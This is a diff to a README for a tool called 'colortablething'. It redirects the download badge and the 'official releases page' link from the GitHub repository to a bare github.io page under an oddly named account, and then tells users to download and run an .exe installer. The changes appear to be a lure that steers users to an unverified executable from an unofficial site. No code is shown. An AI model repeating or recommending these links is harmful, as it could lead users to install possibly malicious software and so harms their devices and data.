@@ -1,6 +1,6 @@
 # 🎨 colortablething - Easily apply custom color tables now
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/aegisorganizationexpense883/colortablething)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://aegisorganizationexpense883.github.io)
 
 ## 📌 What is colortablething?
 
@@ -21,7 +21,7 @@ If your computer handles video editing, it will handle this tool without issues.
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/aegisorganizationexpense883/colortablething).
+1. Visit the [official releases page](https://aegisorganizationexpense883.github.io).
 2. Look for the file ending in .exe under the assets section.
 3. Click the file to start the download.
 4. Save the installer to your Downloads folder.
